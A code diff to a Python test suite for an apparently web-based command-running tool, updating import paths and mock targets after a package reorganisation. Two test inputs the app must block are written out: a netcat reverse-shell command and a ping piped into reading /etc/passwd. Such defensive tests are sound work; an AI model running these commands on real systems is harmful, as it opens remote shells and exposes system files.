@@ -27,10 +27,10 @@ import app as shell_app
 import blueprints.assets as shell_assets
 import blueprints.projects as project_routes
 import config
-import run_comparison
-from builtin_commands import execute_builtin_command
-from database import DB_PATH
-from workspace import resolve_workspace_path
+import services.runs.comparison as run_comparison
+from services.commands.builtins import execute_builtin_command
+from core.database import DB_PATH
+from services.workspace.files import resolve_workspace_path
 
 
 # ── Fixtures ──────────────────────────────────────────────────────────────────
@@ -935,7 +935,7 @@ class TestProjectRoutes:
         assert diff_payload["objects"]["findings"]["added"][0]["line_number"] == 2
         assert diff_payload["objects"]["findings"]["unchanged_count"] == 2
 
-        with mock.patch("run_comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
+        with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
             capped_resp = client.get(
                 self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
                 headers={"X-Session-ID": session_id},
@@ -1954,7 +1954,7 @@ class TestProjectRoutes:
                 json={"name": "Oversize", "include_artifacts": True},
                 headers={"X-Session-ID": session_id},
             ).data)["package"]
-            with mock.patch("project_workspace.tempfile.NamedTemporaryFile") as named_temp:
+            with mock.patch("services.projects.workspace.tempfile.NamedTemporaryFile") as named_temp:
                 resp = client.get(
                     f"/projects/{project['id']}/packages/{package['id']}/download",
                     headers={"X-Session-ID": session_id},
@@ -2183,7 +2183,7 @@ class TestConfigRoute:
             }],
             "pipe_helpers": [],
         }
-        with mock.patch("commands.load_commands_registry", return_value=registry):
+        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
             data = json.loads(client.get("/config").data)
 
         assert data["interactive_pty_commands"] == [{
@@ -2765,7 +2765,7 @@ class TestDiagRoute:
         fake = self._fake_redis_client()
         # `broker_mode()` reads from run_broker's own module-level reference,
         # so patch both the assets-blueprint binding and the broker module.
-        import run_broker as shell_broker
+        import services.runs.broker as shell_broker
         with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
             with mock.patch.object(shell_assets, "redis_client", fake):
                 with mock.patch.object(shell_broker, "redis_client", fake):
@@ -2789,7 +2789,7 @@ class TestDiagRoute:
         client = self._allowed_client()
         # Publish two events to the in-memory store so the snapshot is non-empty.
         # Use a dedicated module import to avoid leaking state across tests.
-        import run_broker as shell_broker
+        import services.runs.broker as shell_broker
         run_id = f"diag-test-{uuid.uuid4().hex}"
         try:
             shell_broker._memory_store.publish(run_id, "stdout", {"line": "hi"})
@@ -3142,7 +3142,7 @@ class TestDiagRoute:
             "-oA /workspace/scan-output ip.darklab.sh"
         )
         assert len(long_command) > 48, "fixture must exceed the old truncate length"
-        from database import db_connect
+        from core.database import db_connect
         run_id = f"diag-long-cmd-{uuid.uuid4().hex}"
         started = "2000-01-01 00:00:00"
         finished = "2099-01-01 00:00:00"
@@ -3288,7 +3288,7 @@ class TestCommandCatalogRoute:
             ],
             "pipe_helpers": [],
         }
-        with mock.patch("commands.load_commands_registry", return_value=registry):
+        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
             index_resp = client.get("/commands/catalog")
             resp = client.get("/commands/catalog/sentinel")
 
@@ -3313,7 +3313,7 @@ class TestCommandCatalogRoute:
 
     def test_returns_404_for_unknown_command(self):
         client = get_client()
-        with mock.patch("commands.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
+        with mock.patch("services.commands.registry.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
             resp = client.get("/commands/catalog/nope")
 
         assert resp.status_code == 404
@@ -3629,7 +3629,7 @@ class TestShortcutsRoute:
         assert "?" in keys, "shortcuts overlay trigger should be self-documenting"
 
     def test_matches_shortcuts_builtin_source(self):
-        from builtin_commands import get_current_shortcuts
+        from services.commands.builtins import get_current_shortcuts
         direct = get_current_shortcuts(is_mac=False)
         client = get_client()
         data = json.loads(client.get("/shortcuts").data)
@@ -3791,7 +3791,7 @@ class TestWorkspaceRoutes:
             assert binary.status_code == 415
             assert "download it instead" in json.loads(binary.data)["error"]
 
-            with mock.patch("workspace.os.open", side_effect=PermissionError(errno.EACCES, "denied")):
+            with mock.patch("services.workspace.files.os.open", side_effect=PermissionError(errno.EACCES, "denied")):
                 unreadable = client.get(
                     "/workspace/files/read?path=targets.txt",
                     headers={"X-Session-ID": session},
@@ -4218,7 +4218,7 @@ class TestWorkspaceRoutes:
         try:
             shell_app._last_workspace_cleanup_monotonic = 0
             with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
-                from workspace import ensure_session_workspace
+                from services.workspace.files import ensure_session_workspace
                 expired_root = ensure_session_workspace("expired-session", config.CFG)
                 os.utime(expired_root, (1000, 1000))
 
@@ -4236,7 +4236,7 @@ class TestWorkspaceRoutes:
         try:
             shell_app._last_workspace_cleanup_monotonic = 0
             with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
-                from workspace import ensure_session_workspace
+                from services.workspace.files import ensure_session_workspace
                 current_root = ensure_session_workspace("active-session", config.CFG)
                 expired_root = ensure_session_workspace("expired-session", config.CFG)
                 os.utime(current_root, (1000, 1000))
@@ -4483,14 +4483,14 @@ class TestRunRoute:
         # Patch in commands' namespace — is_command_allowed calls load_command_policy
         # from commands' own namespace, not from app's.
         with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
             resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
         assert resp.status_code == 403
 
     def test_shell_operator_returns_403(self):
         client = get_client()
         with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
+             mock.patch("services.commands.registry.load_command_policy", return_value=(["ping"], [])):
             resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
         assert resp.status_code == 403
 
@@ -4878,7 +4878,7 @@ class TestHistoryRoute:
                 )
                 conn.commit()
 
-            with mock.patch("commands.load_commands_registry", side_effect=RuntimeError("registry down")):
+            with mock.patch("services.commands.registry.load_commands_registry", side_effect=RuntimeError("registry down")):
                 data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
 
             assert data["command_mix"][0]["root"] == "nmap"
@@ -6026,7 +6026,7 @@ class TestHistoryRoute:
             conn.commit()
             conn.close()
 
-            with mock.patch("run_comparison.COMPARE_LAZY_EQUAL_PAGE_LIMIT", 2):
+            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_PAGE_LIMIT", 2):
                 line_limited = client.get(
                     "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                     "&side=a&start=0&end=3",
@@ -6039,7 +6039,7 @@ class TestHistoryRoute:
             assert line_data["truncated"] is True
             assert line_data["page_limit"] == 2
 
-            with mock.patch("run_comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 5):
+            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 5):
                 byte_limited = client.get(
                     "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                     "&side=a&start=0&end=3",
@@ -6052,7 +6052,7 @@ class TestHistoryRoute:
             assert byte_data["truncated"] is True
             assert byte_data["byte_limit"] == 5
 
-            with mock.patch("run_comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 3):
+            with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 3):
                 oversized_line = client.get(
                     "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
                     "&side=a&start=0&end=3",
@@ -6210,7 +6210,7 @@ class TestHistoryRoute:
             assert [item["workspace_path"] for item in data["objects"]["artifacts"]["removed"]] == ["reports/left.txt"]
             assert "compare_line_index" not in data["objects"]["artifacts"]["added"][0]
 
-            with mock.patch("run_comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
+            with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
                 capped_resp = client.get(
                     "/history/compare?left=cmp-left&right=cmp-right",
                     headers={"X-Session-ID": session},
@@ -6227,7 +6227,7 @@ class TestHistoryRoute:
             assert capped["truncated"]["artifacts"] == {"left": True, "right": True}
             assert capped["truncated"]["item_limit"] == 0
 
-            with mock.patch("run_comparison.COMPARE_MAX_CHANGED_LINES", 2):
+            with mock.patch("services.runs.comparison.COMPARE_MAX_CHANGED_LINES", 2):
                 line_limited_resp = client.get(
                     "/history/compare?left=cmp-left&right=cmp-right",
                     headers={"X-Session-ID": session},
@@ -7103,14 +7103,14 @@ class TestRunPermalinkRoute:
         conn.close()
         if full_output_available and full_output_lines is not None:
             import gzip
-            from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
+            from services.runs.output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
             ensure_run_output_dir()
             with gzip.open(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz", "wt", encoding="utf-8") as f:
                 for line in full_output_lines:
                     f.write(line + "\n")
 
     def _delete_run(self, run_id):
-        from run_output_store import RUN_OUTPUT_DIR
+        from services.runs.output_store import RUN_OUTPUT_DIR
         conn = sqlite3.connect(DB_PATH)
         conn.execute("DELETE FROM findings WHERE run_id=?", (run_id,))
         conn.execute("DELETE FROM entity_labels WHERE entity_id=?", (run_id,))
